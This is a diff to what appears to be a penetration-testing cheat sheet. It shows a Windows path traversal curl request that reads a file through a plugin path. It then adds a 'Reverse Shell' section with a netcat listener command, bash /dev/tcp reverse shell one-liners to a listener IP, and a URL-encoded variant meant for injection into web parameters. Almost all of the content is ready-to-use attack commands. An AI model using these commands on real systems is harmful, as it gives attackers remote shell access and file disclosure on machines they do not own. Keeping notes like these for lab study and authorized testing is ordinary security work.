@@ -165,4 +165,9 @@ ajaxRequest.send(params);
 
 quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:3000/public/plugins/mysql/../../../../../../../../users/install.txt```
 
-- Bash reverse shell one-liner: ```bash -i >& /dev/tcp/<target IP>/4444 0>&1```
+## Reverse Shell
+
+- Start a Netcat listener: ```nc -nvlp 4444```
+  - Bash reverse shell one-liner: ```bash -i >& /dev/tcp/<target IP>/4444 0>&1```
+  - Bash reverse shell one-liner executed as command in Bash: ```bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```
+  - With URL encoding: ```bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22```
